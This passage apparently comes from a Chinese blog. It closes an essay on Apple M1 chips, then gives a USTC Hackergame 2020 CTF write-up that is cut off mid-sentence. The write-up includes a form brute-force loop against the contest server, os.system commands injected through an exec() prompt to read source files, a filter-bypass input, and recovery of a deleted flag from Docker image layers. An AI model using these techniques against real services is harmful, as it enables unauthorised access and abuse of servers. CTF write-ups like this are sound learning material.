上看到了令人惊艳的超低功耗加超高能耗比；而在性能方面，对于一款 ARM 架构的处理器来说，「勉勉强强」能和 Tiger Lake「五五开」也已经是不小的成就了。在上网本、轻薄本级别的 MacBook Air 乃至日后可能重启的 MacBook 12’ Refresh 产品线上，M 系列处理器肯定是不二选择。</p>\n<p>与之对应的是「生产力 Mac」。MacBook Pro、iMac 的目标用户从事的工作大多为移动办公（MBP Only）、绘图、图像处理、音视频创作、影视制作、软件开发、轻度机器学习，而 Mac Pro、iMac Pro 的目标用户则大多从事大型影视剪辑、大型图像处理、大型数字音频制作、三维制作、大型机器学习等工作。而正如我在之前章节所说，让这类行业内的软件优化适配、使其能够发挥 ARM 的硬件的完整性能，还有非常漫长的一段路要走。而在这些行业中，自行组装 PC 固然可以弥补硬件性能上的差距、而在软件生态上 macOS 却是无出其右的，看看 Logic Pro、Final Cut Pro X 就知道了。苹果在未来很长一段时间内都会继续发布搭载 Intel 的 Mac。如果苹果一意孤行，急迫地在这类产品线强上 M 系列处理器，只会迫使这类目标用户转向 Windows 10 和 AMD 的怀抱。</p>\n<p>历史上，苹果的架构选择甚至还会受到苹果公司领导层决策的影响。1992 年苹果就在计划将 Macintosh System（Classic Mac OS）迁移到 X86 架构上，甚至开展了一项秘密计划「Star Trek」。而当更青睐 PowerPC 的苹果新任 CEO 走马上任以后，X86 架构迁移计划就被束之高阁，直到乔布斯重新回到苹果、WWDC 2005 宣布 Mac 将迁移到 Intel 处理器上。因此，也不排除存在这种可能：随着库克离任、苹果领导层变动、ARM 处理器不再向「高性能、密集计算」的方向突破，甚至可能苹果换了 CEO 后 Mac 将会搭载 AMD 处理器，但是这两种可能性显然不大。</p>\n<h2>黑苹果的未来？</h2>\n<p>作为一名黑苹果用户，M1 处理器的发布自然会引起对黑苹果未来的关注。正如我在「<a href=\"https://blog.skk.moe/post/history-osx86/#%E8%8B%B9%E6%9E%9C%E4%BB%80%E4%B9%88%E6%97%B6%E5%80%99%E4%BC%9A%E6%94%BE%E5%BC%83-Intel-%E7%9A%84-x86-%E6%9E%B6%E6%9E%84%EF%BC%9F\">黑苹果的未来</a>」一文中的「苹果什么时候会放弃 Intel 的 x86 架构？」章节中所说，过去 6 年之间每个 macOS 大版本都会兼容至少 7 年以前发布的设备。苹果的副总裁 John Ternus 在 Apple Events 中所说「This journey will take a couple of years to complete, and we have a long way to go」，预示着苹果在未来数年内都会继续发布搭载 Intel 处理器的 Mac。</p>\n<div class=\"license\"> <div class=\"license-title\">谈谈 Apple M1 芯片、ARM、ARM Mac 和黑苹果的未来</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/talk-about-arm-m1-mac/\">https://blog.skk.moe/post/talk-about-arm-m1-mac/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-11-11</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/talk-about-arm-m1-mac/"},{"title":"USTC Hackergame 2020（中科大信安赛）write up","date":"2020-11-06 22:00:00","description":"\n<p>作为一只 CS 零基础、信安零基础、CTF 零基础的菜狐狐，苏卡卡今年又来参加 USTC Hackergame 啦！由于一边做题一边总结思路（指写 Write Up），所以苏卡卡应该是第一个发布非官方的 USTC Hackergame 2020 Write Up 的吧（嘿嘿）。</p>\n<blockquote><p>题图来自 USTC Hackergame 2019「Happy LUG」</p></blockquote>\n<span></span><h2>签到题</h2>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/1.png\" width=\"508\" height=\"417\" class=\"lazy post-img\"></p>\n<p>只要提取 1 个 flag 就好啦！可是，为什么这个反人类的 <code>form-control</code> 的步长竟然是 0.00001：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/2.png\" width=\"794\" height=\"327\" class=\"lazy post-img\"></p>\n<p>继续看下去会发现，用手是根本不可能拖到 1.00000 的：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.5/25.png\" width=\"636\" height=\"277\" class=\"lazy post-img\"></p>\n<p>不管了，直接点击「提取」：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/3.png\" width=\"482\" height=\"393\" class=\"lazy post-img\"></p>\n<p>同时，发现地址栏里的 URL 变成了 <code>http://202.38.93.111:10000/?number=0.84608</code>。那就立刻访问 <code>http://202.38.93.111:10000/?number=1</code> 拿到 flag！</p>\n<blockquote><p>Google 从 Chrome 76 起开始推行 WHATWG URL 规范中的「<a href=\"https://url.spec.whatwg.org/#url-rendering-simplification\">Simplify non-human-readable or irrelevant components</a>」、即「简化非人类可读或不相关的组件」。不过 Chrome 85 起提供了「Always Show Full URLs」的选项，可以在地址栏上右键后从菜单中开启。</p></blockquote>\n<h2>猫咪问答++</h2>\n<blockquote><ol>\n<li>以下编程语言、软件或组织对应标志是哺乳动物的有几个？<br>Docker，Golang，Python，Plan 9，PHP，GNU，LLVM，Swift，Perl，GitHub，TortoiseSVN，FireFox，MySQL，PostgreSQL，MariaDB，Linux，OpenBSD，FreeDOS，Apache Tomcat，Squid，openSUSE，Kali，Xfce.<br>提示：学术上一般认为龙不属于哺乳动物。</li>\n<li>第一个以信鸽为载体的 IP 网络标准的 RFC 文档中推荐使用的 MTU (Maximum Transmission Unit) 是多少毫克？<br>提示：咕咕咕，咕咕咕。</li>\n<li>USTC Linux 用户协会在 2019 年 9 月 21 日自由软件日活动中介绍的开源游戏的名称共有几个字母？<br>提示：活动记录会在哪里？</li>\n<li>中国科学技术大学西校区图书馆正前方（西南方向） 50 米 L 型灌木处共有几个连通的划线停车位？<br>提示：建议身临其境。</li>\n<li>中国科学技术大学第六届信息安全大赛所有人合计提交了多少次 flag？<br>提示：是一个非负整数。</li>\n</ol></blockquote>\n<p>其中，第二题、第三题、第五题的答案分别可以在下述 URL 中找到：</p>\n<ul>\n<li>\n<a href=\"https://tools.ietf.org/html/rfc1149\">RFC1149 - A Standard for the Transmission of IP Datagrams on Avian Carriers</a>：信鸽的典型 MTU 是 256 毫克</li>\n<li>\n<a href=\"https://news.ustclug.org/2019/09/2019-sfd-ustc/\">2019 软件自由日中国科大站 - USTC LUG</a>：开源游戏的名称是 Teeworlds、有 9 个字母</li>\n<li><a href=\"https://news.ustclug.org/2019/12/hackergame-2019/\">中国科学技术大学第六届信息安全大赛圆满结束 - USTC LUG</a></li>\n</ul>\n<p>至于第一题要搜索二十几种吉祥物、一不小心还会数错，第四题要去找卫星图像或者街景图，大尾巴狐狸太懒了、不想搜索了！有没有别的方法获取 flag？</p>\n<p>第一题给了 23 种编程语言、软件或组织：</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-string\">\"Docker，Golang，Python，Plan 9，PHP，GNU，LLVM，Swift，Perl，GitHub，TortoiseSVN，FireFox，MySQL，PostgreSQL，MariaDB，Linux，OpenBSD，FreeDOS，Apache Tomcat，Squid，openSUSE，Kali，Xfce\"</span>.split(<span class=\"hljs-string\">'，'</span>).length<span class=\"hljs-comment\">// 23</span></code></pre>\n<p>至于图书馆前的地上停车位、总不可能超过 100 个吧？</p>\n<p>那么，写一个遍历跑第一题和第四题的答案，总会跑出 Flag 的！</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-keyword\">for</span> (<span class=\"hljs-keyword\">let</span> i = <span class=\"hljs-number\">1</span>; i &lt; <span class=\"hljs-number\">23</span>; i++) { <span class=\"hljs-comment\">// 至少有 1 种哺乳动物；既然提示了龙不是哺乳动物，那么肯定不会 23 种前部都是</span>  <span class=\"hljs-keyword\">for</span> (<span class=\"hljs-keyword\">let</span> j = <span class=\"hljs-number\">0</span>; j &lt; <span class=\"hljs-number\">100</span>; j++) { <span class=\"hljs-comment\">// 一个停车位都没有的可能性不是没有，遍历时要考虑进去</span>    <span class=\"hljs-keyword\">const</span> formData = <span class=\"hljs-keyword\">new</span> FormData();    formData.append(<span class=\"hljs-string\">'q1'</span>, i);    formData.append(<span class=\"hljs-string\">'q2'</span>, <span class=\"hljs-number\">256</span>);    formData.append(<span class=\"hljs-string\">'q3'</span>, <span class=\"hljs-number\">9</span>);    formData.append(<span class=\"hljs-string\">'q4'</span>, j);    formData.append(<span class=\"hljs-string\">'q4'</span>, <span class=\"hljs-number\">17098</span>);    fetch(<span class=\"hljs-string\">'http://202.38.93.111:10001/'</span>, {      <span class=\"hljs-attr\">body</span>: formData,      <span class=\"hljs-attr\">method</span>: <span class=\"hljs-string\">'POST'</span>,    }).then(<span class=\"hljs-function\"><span class=\"hljs-params\">resp</span> =&gt;</span> resp.text()).then(<span class=\"hljs-function\"><span class=\"hljs-params\">text</span> =&gt;</span> {      <span class=\"hljs-keyword\">if</span> (!text.includes(<span class=\"hljs-string\">'没有全部答对，不能给你 flag'</span>)) {        <span class=\"hljs-built_in\">console</span>.log(i, j, text);      }    });  }}</code></pre>\n<p>果然，<del>通过对比赛平台的 CC 攻击</del>，很快就把第一题和第四题答案跑出来了：第一题的答案是 12、第四题的答案是 9。输入正确答案提交即可获取 flag。</p>\n<h2>2048</h2>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/4.png\" width=\"680\" height=\"888\" class=\"lazy post-img\"></p>\n<p>毫无疑问，这道题如果真的玩到 2048 获取 Flag 是肯定可行的，但是我懒；同样的原因，我也不想对这个网站里每个 JS 都审计一次。既然如此，不如先随便玩玩，看看这道题的 Flag 大概会藏在哪里。</p>\n<p>随便乱敲方向键刻意使 Game Over，DevTools 截获了一个 HTTP 请求、是 <code>html_actuator.js</code> 第 164 行发起的：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/5.png\" width=\"1862\" height=\"712\" class=\"lazy post-img\"></p>\n<p>现在我们直接审计 <code>html_actuator.js</code> 就好了，把发起 AJAX 请求的函数找出来：</p>\n<pre><code class=\"hljs js\">HTMLActuator.prototype.message = <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">won</span>) </span>{  <span class=\"hljs-keyword\">var</span> type    = won ? <span class=\"hljs-string\">\"game-won\"</span> : <span class=\"hljs-string\">\"game-over\"</span>;  <span class=\"hljs-keyword\">var</span> message = won ? <span class=\"hljs-string\">\"FLXG 大成功！\"</span> : <span class=\"hljs-string\">\"FLXG 永不放弃！\"</span>;  <span class=\"hljs-keyword\">var</span> url;  <span class=\"hljs-keyword\">if</span> (won) {    url = <span class=\"hljs-string\">\"/getflxg?my_favorite_fruit=\"</span> + (<span class=\"hljs-string\">'b'</span>+<span class=\"hljs-string\">'a'</span>+ +<span class=\"hljs-string\">'a'</span>+<span class=\"hljs-string\">'a'</span>).toLowerCase();  } <span class=\"hljs-keyword\">else</span> {    url = <span class=\"hljs-string\">\"/getflxg?my_favorite_fruit=\"</span>;  }  <span class=\"hljs-keyword\">let</span> request = <span class=\"hljs-keyword\">new</span> XMLHttpRequest();  request.open(<span class=\"hljs-string\">'GET'</span>, url);  request.responseType = <span class=\"hljs-string\">'text'</span>;  request.onload = <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>) </span>{    <span class=\"hljs-built_in\">document</span>.getElementById(<span class=\"hljs-string\">\"game-message-extra\"</span>).innerHTML = request.response;  };  request.send();  <span class=\"hljs-built_in\">this</span>.messageContainer.classList.add(type);  <span class=\"hljs-built_in\">this</span>.messageContainer.getElementsByTagName(<span class=\"hljs-string\">\"p\"</span>)[<span class=\"hljs-number\">0</span>].textContent = message;  <span class=\"hljs-built_in\">this</span>.clearContainer(<span class=\"hljs-built_in\">this</span>.sharingContainer);  <span class=\"hljs-built_in\">this</span>.sharingContainer.appendChild(<span class=\"hljs-built_in\">this</span>.scoreTweetButton());};</code></pre>\n<p>看了代码就知道怎么获取 Flag 了，直接 GET <code>/getflxg?my_favorite_fruit=banana</code> 即可。</p>\n<blockquote><p>小彩蛋，在 JavaScript 中字符串类型 <code>String</code> 转换成数字类型 <code>Number</code> 时会得到 <code>NaN</code>，凑成了 <code>banana</code>。</p></blockquote>\n<h2>一闪而过的 Flag</h2>\n<blockquote>\n<p>…… <strong>程序每次运行时隐约可见黑色控制台上有 flag 一闪而过。</strong></p>\n<p>……</p>\n<p>而你作为一名新生，不由动了恻隐之心。望着诗人潇洒远去的背影，你可以赶在下午诗人回来之前，帮助这位可怜的人，用 flag 装满他的饭盒吗?</p>\n<p><a href=\"https://archive.org/details/untitled-01_exe\">打开/下载题目</a> （Hosted at Internet Archive）</p>\n</blockquote>\n<p>欺负苏卡卡用 macOS 不用 Windows，哼！苏卡卡才不会重启到 Windows 就为了看个 flag 呢，Parallels Desktop 启动！</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/21.png\" width=\"1423\" height=\"781\" class=\"lazy post-img\"></p>\n<p>没有什么是截图解决不了的。。。啊，什么？还要区分 <code>i I 1 l</code>？<del>当然是猜 flag 啦</del></p>\n<p>小 Tip，打开 CMD、左上角图标右键、「默认值」，是可以设置「控制台窗口」默认字体和字号的：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/22.png\" width=\"800\" height=\"440\" class=\"lazy post-img\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/23.png\" width=\"800\" height=\"440\" class=\"lazy post-img\"></p>\n<p>改了字体以后，这不就分得清清楚楚啦！</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/24.png\" width=\"1067\" height=\"586\" class=\"lazy post-img\"></p>\n<h2>从零开始的记账工具人</h2>\n<blockquote>\n<p>如同往常一样，你的 npy 突然丢给你一个购物账单：“我今天买了几个小玩意，你能帮我算一下一共花了多少钱吗？”</p>\n<p>你心想：<del>又双叒叕要开始吃土了</del> 这不是很简单吗？电子表格里面一拖动就算出来了</p>\n<p>只不过拿到账单之后你才注意到，似乎是为了剁手时更加的安心，这次的账单上面的金额全使用了中文大写数字</p>\n<p><strong>注意：请将账单总金额保留小数点后两位，放在 <code>flag{}</code> 中提交，例如总金额为 123.45 元时，你需要提交 <code>flag{123.45}</code></strong></p>\n</blockquote>\n<p>这道题上来继续欺负苏卡卡没有在 macOS 上安装 Office，<del>大尾巴狐狸非常生气</del>。你看 npm 上这个能解析 <code>xlsx</code> 文件的 SheetJS、大写数字转小写的 nzh 还蛮好用的。Node.js 代码如下：</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-keyword\">const</span> XLSX = <span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">'xlsx'</span>); <span class=\"hljs-comment\">// 解析 xlsx 用</span><span class=\"hljs-keyword\">const</span> NzhCN = <span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">'nzh/cn'</span>); <span class=\"hljs-comment\">// 大写数字转小写</span><span class=\"hljs-keyword\">const</span> xlsx = XLSX.readFile(<span class=\"hljs-string\">'./bills.xlsx'</span>); <span class=\"hljs-comment\">// 当然你要先把 xlsx 文件下载下来</span><span class=\"hljs-keyword\">const</span> data = XLSX.utils.sheet_to_json(xlsx.Sheets[xlsx.SheetNames[<span class=\"hljs-number\">0</span>]]);<span class=\"hljs-keyword\">let</span> count = <span class=\"hljs-number\">0</span>;data.forEach(<span class=\"hljs-function\"><span class=\"hljs-params\">row</span> =&gt;</span> {  <span class=\"hljs-keyword\">const</span> moneyData = { <span class=\"hljs-attr\">yuan</span>: <span class=\"hljs-number\">0</span>, <span class=\"hljs-attr\">jiao</span>: <span class=\"hljs-number\">0</span>, <span class=\"hljs-attr\">fen</span>: <span class=\"hljs-number\">0</span> };  <span class=\"hljs-comment\">// nzh 不支持处理金额，需要自己实现一个</span>  <span class=\"hljs-keyword\">let</span> tmp;  [[<span class=\"hljs-string\">'元'</span>, <span class=\"hljs-string\">'yuan'</span>], [<span class=\"hljs-string\">'角'</span>, <span class=\"hljs-string\">'jiao'</span>], [<span class=\"hljs-string\">'分'</span>, <span class=\"hljs-string\">'fen'</span>]].forEach(<span class=\"hljs-function\">(<span class=\"hljs-params\">[i, dataKey]</span>) =&gt;</span> {    tmp = (tmp || row[<span class=\"hljs-string\">'单价'</span>]).split(i);    <span class=\"hljs-keyword\">if</span> (tmp.length === <span class=\"hljs-number\">1</span>) {      tmp = tmp[<span class=\"hljs-number\">0</span>]    } <span class=\"hljs-keyword\">else</span> {      moneyData[dataKey] = NzhCN.decodeB(tmp[<span class=\"hljs-number\">0</span>]);      tmp = tmp[<span class=\"hljs-number\">1</span>]    }  });  <span class=\"hljs-comment\">// 处理金额时，要小心浮点数大坑哟</span>  <span class=\"hljs-keyword\">const</span> value = moneyData.yuan * <span class=\"hljs-number\">100</span> + moneyData.jiao * <span class=\"hljs-number\">10</span> + moneyData.fen;  count = count + value * row[<span class=\"hljs-string\">'数量'</span>];});<span class=\"hljs-built_in\">console</span>.log(<span class=\"hljs-string\">`flag{<span class=\"hljs-subst\">${(count<span class=\"hljs-regexp\">/100).toFixed(2)}}`); /</span><span class=\"hljs-regexp\">/ 直接打印 flag</span></span></span></code></pre>\n<h2>超简单的世界模拟器</h2>\n<blockquote>\n<p>……</p>\n<p>你的任务是在生命游戏的世界中，复现出蝴蝶扇动翅膀，引起大洋彼岸风暴的效应。</p>\n<p>通过改变左上角 15x15 的区域，在游戏演化 200 代之后，如果被特殊标注的正方形内的细胞被“清除”，你将会得到对应的 flag：</p>\n<p>“清除”任意一个正方形，你将会得到第一个 flag。同时“清除”两个正方形，你将会得到第二个 flag。</p>\n</blockquote>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.5/26.png\" width=\"919\" height=\"936\" class=\"lazy post-img\"></p>\n<p>在 Google 上搜索「生命游戏」，找到了一个知乎提问和 <a href=\"https://www.conwaylife.com/wiki/Main_Page\">Conway Life Game Wiki</a>。大概了解康威生命游戏是什么后就理解了题目的要求：要在 15x15 的范围内构建一个生命游戏图形、在演化到 200 代之后会清除两个种群。</p>\n<p>第一个 Payload 是一艘最简单的会向右平移「飞船」（这个图形在知乎或是 Life Game Wiki 上都可以被轻易找到），可以直接摧毁第一个种群：</p>\n<pre><code class=\"hljs plaintext\">00000110111101101100011</code></pre>\n<p>第二个 Payload 是我一不小心试出来的，由一个平移的「飞船」和一个沿着斜对角线行走的「滑翔者」共同组成，他们会「擦弹」引发「大爆炸」，在 80 代左右摧毁第一个种群、在 160 代左右摧毁第二个种群：</p>\n<pre><code class=\"hljs plaintext\">0000011011110110110001100001101011</code></pre>\n<h2>从零开始的火星文生活</h2>\n<blockquote>\n<p>……</p>\n<p>L 同学打开附件一看，傻眼了，全都是意义不明的汉字。机智的 L 同学想到 Q 同学平时喜欢使用 <strong>GBK 编码</strong>，也许是打开方式不对。结果用 GBK 打开却看到了一堆夹杂着日语和数字的<strong>火星文</strong>……</p>\n<p>L 同学彻底懵逼了，几经周折，TA 找到了科大最负盛名的火星文专家 (你)。依靠多年的字符编码解码的经验，你可以破译 Q 同学发来的火星文是什么意思吗？</p>\n<p>注：正确的 flag 全部由 <strong>ASCII</strong> 字符组成！</p>\n</blockquote>\n<p>这种 GBK、UTF-8 之间的火星文编码问题，直接给一个 Unix 下的 <strong>万能解法</strong>：</p>\n<pre><code class=\"hljs bash\">cat gibberish_message.txt | iconv -f utf8 -t gbk | iconv -f utf8 -t latin1 | iconv -f gbk -t utf8</code></pre>\n<p>剩下要做的，就是把全角转换成半角了。</p>\n<h2>自复读的复读机</h2>\n<blockquote>\n<p>能够复读其他程序输出的程序只是普通的复读机。</p>\n<p>顶尖的复读机还应该能复读出自己的源代码。</p>\n<p>什么是国际复读机啊（战术后仰）</p>\n<p>你现在需要编写两个只有一行 Python 代码的顶尖复读机：</p>\n<ul>\n<li>其中一个要输出代码本身的逆序（即所有字符从后向前依次输出）</li>\n<li>另一个是输出代码本身的 sha256 哈希值，十六进制小写</li>\n</ul>\n<p>满足两个条件分别对应了两个 flag。</p>\n<p>快来开始你的复读吧~</p>\n</blockquote>\n<p>访问题目，输出的提示信息是：</p>\n<pre><code class=\"hljs plaintext\">Your one line python code to exec():</code></pre>\n<p>什么，可以 <code>exec()</code> 啊？那大尾巴狐狸直接干坏事了：</p>\n<pre><code class=\"hljs plaintext\">Your one line python code to exec(): import os; os.system(\"ls\")</code></pre>\n<p>发现目录下面有一个 <code>checker.py</code> 和一个 <code>runner.py</code>。接着用 <code>os.system(\"cat *.py\")</code> 获得题目源码：</p>\n<pre><code class=\"hljs python\"><span class=\"hljs-comment\"># checker.py</span><span class=\"hljs-keyword\">import</span> subprocess<span class=\"hljs-keyword\">import</span> hashlib<span class=\"hljs-keyword\">if</span> __name__ == <span class=\"hljs-string\">\"__main__\"</span>:    code = <span class=\"hljs-built_in\">input</span>(<span class=\"hljs-string\">\"Your one line python code to exec(): \"</span>)    <span class=\"hljs-built_in\">print</span>()    <span class=\"hljs-keyword\">if</span> <span class=\"hljs-keyword\">not</span> code:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Code must not be empty\"</span>)        exit(-<span class=\"hljs-number\">1</span>)    p = subprocess.run(        [<span class=\"hljs-string\">\"su\"</span>, <span class=\"hljs-string\">\"nobody\"</span>, <span class=\"hljs-string\">\"-s\"</span>, <span class=\"hljs-string\">\"/bin/bash\"</span>, <span class=\"hljs-string\">\"-c\"</span>, <span class=\"hljs-string\">\"/usr/local/bin/python3 /runner.py\"</span>],        <span class=\"hljs-built_in\">input</span>=code.encode(),        stdout=subprocess.PIPE,    )    <span class=\"hljs-keyword\">if</span> p.returncode != <span class=\"hljs-number\">0</span>:        <span class=\"hljs-built_in\">print</span>()        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Your code did not run successfully\"</span>)        exit(-<span class=\"hljs-number\">1</span>)    output = p.stdout.decode()    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Your code is:\"</span>)    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-built_in\">repr</span>(code))    <span class=\"hljs-built_in\">print</span>()    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Output of your code is:\"</span>)    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-built_in\">repr</span>(output))    <span class=\"hljs-built_in\">print</span>()    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Checking reversed(code) == output\"</span>)    <span class=\"hljs-keyword\">if</span> code[::-<span class=\"hljs-number\">1</span>] == output:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-built_in\">open</span>(<span class=\"hljs-string\">\"/root/flag1\"</span>).read())    <span class=\"hljs-keyword\">else</span>:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Failed!\"</span>)    <span class=\"hljs-built_in\">print</span>()    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Checking sha256(code) == output\"</span>)    <span class=\"hljs-keyword\">if</span> hashlib.sha256(code.encode()).hexdigest() == output:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-built_in\">open</span>(<span class=\"hljs-string\">\"/root/flag2\"</span>).read())    <span class=\"hljs-keyword\">else</span>:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Failed!\"</span>)<span class=\"hljs-comment\"># runner.py</span><span class=\"hljs-built_in\">exec</span>(<span class=\"hljs-built_in\">input</span>())</code></pre>\n<blockquote><p>不要想着直接 <code>exec()</code> 偷 flag 了，你以为这比赛是 ylb 搞的啊？</p></blockquote>\n<p>可以看到「反向复读」的检查中使用了 <code>[::-1]</code> 倒序，所以在构造反向复读的语句中也应该使用 <code>[::-1]</code>。</p>\n<p>首先是构建正向复读的语句，在 Google 中 <del>盲目</del> 搜索的过程中确定了关键词「Quine Python」、找到了 <a href=\"https://www.geeksforgeeks.org/quine-in-python/\">这个网站</a>，介绍了如下语句：</p>\n<pre><code class=\"hljs python\">_=<span class=\"hljs-string\">'_=%r;print (_%%_)'</span>;<span class=\"hljs-built_in\">print</span> (_%_)</code></pre>\n<p>那个网站也给出了这个语句的详细解释，不过简单来说，我们利用了 <code>print</code> 字符格式化、通过 <code>%r</code>（当然也可以用 <code>%s</code>）获得 <code>_</code> 变量的取值；而在 <code>_</code> 变量中使用了 <code>%%</code> 防止 <code>%</code> 被转义。</p>\n<p>既然有了正向复读，稍加改动即可得到反向复读。首先在 <code>print(_&amp;_)</code> 中加上 <code>[::-1]</code> 获得倒叙，同时也要对应修改 <code>_</code> 变量：</p>\n<pre><code class=\"hljs python\">_=<span class=\"hljs-string\">')]1-::[_%%_(tnirp;%r=_'</span>;<span class=\"hljs-built_in\">print</span>(_%_[::-<span class=\"hljs-number\">1</span>])</code></pre>\n<p>信心满满地去提交，结果 Check Failed，发现 <code>print</code> 在结尾带上了换行符。所以再为 <code>print</code>再加上 <code>end=\"\"</code> 即可：</p>\n<pre><code class=\"hljs python\">_=<span class=\"hljs-string\">')\"\"=dne,]1-::[_%%_(tnirp;%r=_'</span>;<span class=\"hljs-built_in\">print</span>(_%_[::-<span class=\"hljs-number\">1</span>],end=<span class=\"hljs-string\">\"\"</span>)</code></pre>\n<p>成功获得第一个 flag。</p>\n<h2>233 同学的字符串工具</h2>\n<blockquote>\n<p>233 同学最近刚刚学会了 Python 的字符串操作，于是写了两个小程序运行在自己的服务器上。这个工具提供两个功能：</p>\n<ul>\n<li>字符串大写工具</li>\n<li>UTF-7 到 UTF-8 转换工具</li>\n</ul>\n<p>除了点击下方的打开题目按钮使用网页终端，你也可以通过 <code>nc 202.38.93.111 10233</code> 命令连接到 233 同学的服务上。你可以在这里看到 233 同学的源代码: <a href=\"https://gist.github.com/SukkaW/80d5c5d30786a758fe1f014d6a48b799#file-string_tool-py\">string_tool.py</a>。</p>\n</blockquote>\n<p>这一道题我先拿到了第二个 flag 后才拿到了第一个 flag。首先在 <code>www.string-function.com</code> 这个网站上找到了 UTF-7 和 ASCII 编码互换表： <a href=\"http://string-functions.com/encodingtable.aspx?encoding=65000&amp;decoding=20127\">UTF-7 =&gt; ASCII</a> <a href=\"http://string-functions.com/encodingtable.aspx?encoding=20127&amp;decoding=65000\">ASCII =&gt; UTF-7</a>，照着表（加上一些简单的推算）将 <code>flag</code> 编码成 <code>+AGYAbABhAGc-</code>、成功拿到第二个 flag。</p>\n<p>获得第二个 flag 以后，决定根据相同的思路去查 Unicode sheet，但是直到后来经过提醒才想起来有「<a href=\"https://en.wikipedia.org/wiki/Orthographic_ligature\">合字</a>」这种神奇的存在，最终利用 <a href=\"https://www.compart.com/en/unicode/U+FB02#UNC_DB\"><code>U+FB02</code></a> 构造出 Payload 获得第一个 flag。</p>\n<h2>233 同学的 Docker</h2>\n<blockquote>\n<p>233 同学在软工课上学到了 Docker 这种方便的东西，于是给自己的字符串工具项目写了一个 Dockerfile。</p>\n<p>但是 233 同学突然发现它不小心把一个私密文件（<code>flag.txt</code>）打包进去了，于是写了一行命令删掉这个文件。</p>\n<p>「既然已经删掉了，应该不会被人找出来吧？」233 想道。</p>\n</blockquote>\n<p>首先让我们 <a href=\"https://hub.docker.com/layers/8b8d3c8324c7/stringtool/latest/images/sha256-aef87a00ad7a4e240e4b475ea265d3818c694034c26ec227d8d4f445f3d93152?context=explore\">看看这个 Docker Image 是怎么构建的</a>（不需要用 image 反推 Dockerfile 这种奇技淫巧，DockerHub 可以直接查看 Public 的 Docker Images 的构建过程），可以发现 233 同学首先把所有文件都添加到 Docker Image 中、再通过 <code>/bin/sh -c rm /code/flag.txt</code> 删除了 <code>flag.txt</code>。</p>\n<p>由于 Docker Image 在构建时每一个 RUN 都会新建一个 Layer，因此即使 233 同学通过 RUN 删掉了 <code>flag.txt</code>，flag 肯定还存在于某个地方，而且「某个地方」就包括本机的 <code>/var/lib/docker/overlay2</code> ：</p>\n<pre><code class=\"hljs bash\">$ docker run 8b8d3c8324c7/stringtool <span class=\"hljs-comment\"># 下载执行 8b8d3c8324c7/stringtool</span>[Redacted]Nothing here... <span class=\"hljs-comment\"># Docker Image 执行的输出</span>$ <span class=\"hljs-built_in\">cd</span> /var/lib/docker/overlay2$ find -name flag.txt./befaa134f7d0cc9e964e7790b7c11dde6d0df3104cd88667f7676e46f409705f/diff/code/flag.txt./8c07cc3c01c52b8cf0684518e68a31bfb1f843392f973fef9add587d554c6fab/diff/code/flag.txt<span class=\"hljs-comment\"># Duang，flag.txt 它出现了</span>$ <span class=\"hljs-built_in\">cd</span> befaa134f7d0cc9e964e7790b7c11dde6d0df3104cd88667f7676e46f409705f/diff/code/$ cat flag.txt<span class=\"hljs-comment\"># flag 到手，嘿嘿</span></code></pre>\n<h2>从零开始的 HTTP 链接</h2>\n<blockquote>\n<p>众所周知，数组下标应当从 0 开始。</p>\n<p>同样的，TCP 端口也应当从 0 开始。为了实践这一点，我们把一个网站架设在服务器的 0 号端口上。</p>\n<p>你能成功连接到 0 号端口并拿到 flag 吗？</p>\n<p><strong>点击下面的打开题目按钮是无法打开网页的，因为普通的浏览器会认为这是无效地址。</strong></p>\n</blockquote>\n<p>TCP/IP 中「端口」这个概念，甚至早于互联网的发明：早在 ARPANET 网中的供电协议中就有 8 个比特用于决定应该由计算机上的哪个程序接收该信息（当时这 8 个比特被称为 AEN、Another Eight Numbers），可以参考我之前翻译的一篇文章「<a href=\"https://blog.skk.moe/post/history-of-url/\">URL 的历史</a>」。现在 TCP 的端口共有 